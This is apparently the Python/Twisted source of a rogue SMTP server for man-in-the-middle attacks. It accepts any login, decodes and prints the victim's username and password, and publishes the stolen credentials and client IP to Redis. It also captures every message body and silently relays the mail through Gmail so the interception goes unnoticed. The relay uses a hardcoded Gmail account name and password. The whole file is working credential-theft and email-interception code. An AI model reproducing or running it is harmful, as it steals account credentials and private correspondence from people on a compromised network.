import sys
import binascii
import redis
import json
import time
import os
import inspect
import socket
import email
from quopri import decodestring

from OpenSSL import SSL

from zope.interface import implements

from twisted.internet import defer, reactor, ssl
from twisted.mail import smtp
from twisted.mail.imap4 import LOGINCredentials
from twisted.python import log

try:
	from cStringIO import StringIO
except ImportError:
	from StringIO import StringIO

scriptFolder = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))


smtpRedisClient = None


class JJMessage(object):
	implements(smtp.IMessage)

	def __init__(self, protocol, recipient):
		self.protocol = protocol
		self.recipient = str(recipient)
		self.lines = []
		self.mailClient = ''

	def lineReceived(self, line):
		mailClient = self.getHeaderByKey(line, 'X-Mailer')
		if mailClient is not None:
			self.mailClient = mailClient

		subject = self.getHeaderByKey(line, 'Subject')
		if subject is not None:
			self.subject = subject

		self.lines.append(line)

	def getHeaderByKey(self, line, headerKey):
		headerKey += ': '
		if line.find(headerKey) >= 0:
			split = line.split(headerKey)
			if len(split) == 2:
				return split[1]
		return None

	def getMessageBody(self, rawInput):
		body = email.message_from_string(rawInput)
		for part in body.walk():
			print part.get_content_type()
			if part.get_content_type() == 'text/plain':
				val = str(decodestring(part.get_payload()))
				return val.decode(part.get_content_charset(), 'ignore')
		return ''

	def eomReceived(self):
		print "New messsage received."
		self.lines.append('')
		messageDataLines = '\n'.join(self.lines)
		rawMessageData = str(messageDataLines)
		mailBody = self.getMessageBody(rawMessageData)


		# Publish mail to redis
		d = {}
		d['from'] = str(self.protocol.origin)
		d['to'] = str(self.recipient)
		d['message'] = mailBody
		d['date'] = int(time.time() * 1000)
		d['IP'] = self.protocol.remoteHostIp
		d['hostname'] = self.protocol.remoteHostname
		d['mailclient'] = self.mailClient
		d['subject'] = self.subject
		
		try:
			smtpRedisClient.publish('new:mail', json.dumps(d))
		except:
			print "Publishing failed"
			pass

		print 'REALLY SENDING THE MAIL'

		msg = StringIO(rawMessageData)
		self.msgIO = msg
		self.realMailTransfer()
		
		return defer.succeed(None)
		

	def connectionLost(self):
		print "Connection lost unexpectedly"

	def realMailTransfer(self, portIndex = -1):
		portIndex += 1

		host = 'smtp.gmail.com'
		portsToTry = [25, 465, 587] # try all SMTP ports
		uname = 'wearethejj@gmail.com'
		pword = 'muschi123'

		if portIndex < len(portsToTry):
			print "Trying port " + str(portsToTry[portIndex])
			dfd = sendmail(uname, pword, self.protocol.origin, self.recipient, self.msgIO, host, portsToTry[portIndex])
			dfd.addCallbacks((lambda result: lp("Mail successfully sent")), (lambda result: self.realMailTransfer(portIndex)))
		else:
			print 'All ports unsuccessfully tried. Mail cannot be sent'
		
		return None


class JJMessageDelivery(object):
	implements(smtp.IMessageDelivery)

	def __init__(self, protocol):
		self.protocol = protocol

	def receivedHeader(self, helo, origin, recipients):
		clientHostname, clientIP = helo

	def validateFrom(self, helo, origin):
		self.protocol.origin = origin
		return origin

	def validateTo(self, user):
		return lambda: JJMessage(self.protocol, user)

class JJESMTP(smtp.ESMTP):

	# scraped stuff we need for later when actually sending the mail
	username = None
	password = None

	origin = None


	def __init__(self, chal = None, contextFactory = None):
		print "-- Say hello to JJESMTP, bitches!"
		smtp.ESMTP.__init__(self, chal, contextFactory)
		self.delivery = JJMessageDelivery(self)

	def sendLine(self, line):
		print "Sending: " + line
		return self.transport.writeSequence((line, self.delimiter))

	def lineReceived(self, line):
		print "Received: " + line
		self.resetTimeout()
		return getattr(self, 'state_' + self.mode)(line)

	def state_AUTH(self, response):
		
		if response is None:
		    challenge = self.challenger.getChallenge()
		    encoded = challenge.encode('base64')
		    self.sendCode(334, encoded)
		    return

		if response == '*':
		    self.sendCode(501, 'Authentication aborted')
		    self.challenger = None
		    self.mode = 'COMMAND'
		    return

		self.credentials_base64 = response
		try:
		    uncoded = response.decode('base64')
		    print uncoded
		    if not self.username:
		    	self.username = uncoded
		    	# Now ask for password
		    	self.sendCode(334, 'UGFzc3dvcmQ6')
		    	return
		    elif not self.password:
		    	self.password = uncoded
		    
		except binascii.Error:
			self.sendCode(501, 'Syntax error in parameters or arguments')
			return

		# simply say all is well if we have anything
		if self.username and self.password:
			self.mode = 'COMMAND'
			self.authenticated = True
			self.sendCode(235, 'Authentication successful.')

			# publish credentials to redis
			print 'Publishing mail account credentials to redis'
			c = {}
			c['date'] = int(time.time() * 1000)
			c['username'] 	= self.username
			c['password'] 	= self.password
			c['IP'] 		= self.remoteHostIp
			c['hostname']	= self.remoteHostname

			try:
				smtpRedisClient.publish("new:mail_credentials", json.dumps(c))
			except:
				print "Publishing failed"
				pass

	def do_EHLO(self, rest):
		smtp.ESMTP.do_EHLO(self, rest)
		self.remoteHostIp = self._helo[1]
		self.remoteHostname = ''
		try:
			self.remoteHostname = socket.gethostbyaddr(self.remoteHostIp)[0]
		except:
			pass


# For our SSL shizzl
class ServerTLSContext(ssl.DefaultOpenSSLContextFactory):
    def __init__(self, *args, **kw):
        kw['sslmethod'] = SSL.TLSv1_METHOD
        ssl.DefaultOpenSSLContextFactory.__init__(self, *args, **kw)


class JJSMTPFactory(smtp.SMTPFactory):
	protocol = JJESMTP

	def buildProtocol(self, addr):
		log.msg("building protocol")
		
		#
		# @todo: Here we should get the real host and port from iptables in Subterfuge somehow
		#

		proto = smtp.SMTPFactory.buildProtocol(self, addr)

		# AUTH challengers
		proto.challengers = {"LOGIN": LOGINCredentials}

		# SSL
		proto.ctx = ServerTLSContext(privateKeyFileName=scriptFolder + '/certs/server.key', certificateFileName=scriptFolder + '/certs/server.crt')

		return proto


def configureSMTPTraffic():
	print 'Configuring mail traffic'
	log.startLogging(sys.stdout)
	
	# port 25
	reactor.listenTCP(9998, JJSMTPFactory())
	# port 465
	reactor.listenTCP(9997, JJSMTPFactory())
	# port 587
	reactor.listenTCP(9996, JJSMTPFactory())

	# kickoff
	setupRedis()
	reactor.run()

def setupRedis():
	print 'Setting up Redis for SMTP'
	global smtpRedisClient
	smtpRedisClient = redis.Redis(host="127.0.0.1", port=6379, db=0)

def lp(x):
	print x
	return None

def sendmail(
    authenticationUsername, authenticationSecret,
    fromAddress, toAddress,
    messageFile,
    smtpHost, smtpPort=25
    ):

    contextFactory = ssl.ClientContextFactory()
    contextFactory.method = SSL.SSLv3_METHOD

    resultDeferred = defer.Deferred()

    senderFactory = smtp.ESMTPSenderFactory(
        authenticationUsername,
        authenticationSecret,
        fromAddress,
        toAddress,
        messageFile,
        resultDeferred,
        0,
        contextFactory=contextFactory)

    reactor.connectTCP(smtpHost, smtpPort, senderFactory)

    return resultDeferred
